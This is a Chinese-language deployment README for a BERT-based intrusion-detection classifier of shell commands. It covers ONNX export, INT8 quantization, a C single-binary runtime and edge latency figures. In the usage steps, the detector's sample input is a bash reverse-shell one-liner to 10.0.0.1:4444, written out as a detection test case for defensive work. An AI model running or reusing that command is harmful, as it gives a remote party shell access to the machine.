# 部署

> 主发布已切换为 Rust 单二进制：`deploy/ort_rust_demo/`。
> C 运行时仍保留在 `deploy/c_runtime/`，作为 legacy。

最终模型：`prajjwal1/bert-small`（29.8M）+ 31 标签（verdict 3 + action 28）。
MITRE tactic/technique 由 `hyperids.schema.derive_attck()` 规则表推导，不在模型中预测。

## 两种部署方式

| 方式 | 产物 | 依赖 | 峰值 RSS |
|---|---|---|---|
| ONNX Runtime（INT8） | `model_int8.onnx` 约 17.6MB | onnxruntime | 约 96MB |
| **C 单二进制（推荐）** | 静态可执行文件约 18.4MB | 无（statically linked） | **约 27–38 MiB** |

## 使用流程

```bash
# 1) 导出 ONNX（31 标签一次前向；输入口径与 predict.py 对齐，无 [CLS]）
python deploy/export_onnx.py --model_dir model/checkpoints_gpu/final_model_v9 \
    --out model/checkpoints_gpu/final_model_v9/model.onnx --chunk 31 --seq_len 256

# 2) INT8 量化
python deploy/quantize_int8.py --in model/checkpoints_gpu/final_model_v9/model.onnx \
    --out model/checkpoints_gpu/final_model_v9/model_int8.onnx

# 3) C 单二进制（纯 C 推理，权重 int8 内嵌）
cd deploy/c_runtime && make
./build/hyperids 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

## 推理约定

31 标签一次前向输出 logits：前 3 个是 verdict（softmax/argmax），后 28 个是 action
（sigmoid，阈值 0.5）。拿到 action 集合后调用 `schema.derive_attck(actions)` 得到 tactic/technique。

详见 `deploy/c_runtime/README.md`。

## 端侧 / 低端设备部署结论

当前模型是 29.8M 的 BERT-small + 31 标签 GLiClass 头，每条命令约 2.8B MACs。
在低端路由器单核上做到 10ms 不现实；必须减少计算量（蒸馏小模型 / 缩短输入）或使用量化推理后端。

本机实测（120 条私有命令，seq=256）：
- C 单二进制 OpenMP 4 线程：约 74 ms/条；
- ONNX Runtime INT8：1 线程 p50 约 12.7ms，8 线程 p50 约 9.9ms。

> 注意：`seq_len=256` 表示标签前缀（193 token）+ 命令 + `[SEP]` 后最多 256 token，
> 也就是命令部分最多约 62 token。长命令需要 `--seq_len 512` 并配滑动窗口，否则会被截断；
> 当前纯 C 运行时仍保留 512 上限与滑动窗口逻辑，不受此限制。

若必须纯 C 单二进制，下一步应做 ARM NEON int8 GEMM、ggml Q4_0 权重和 256-token 上限，
但 10ms 在低端设备上仍建议先做模型蒸馏，而不是继续硬优化当前 29.8M 模型。
详见 `docs/EDGE_DEPLOY.md`。
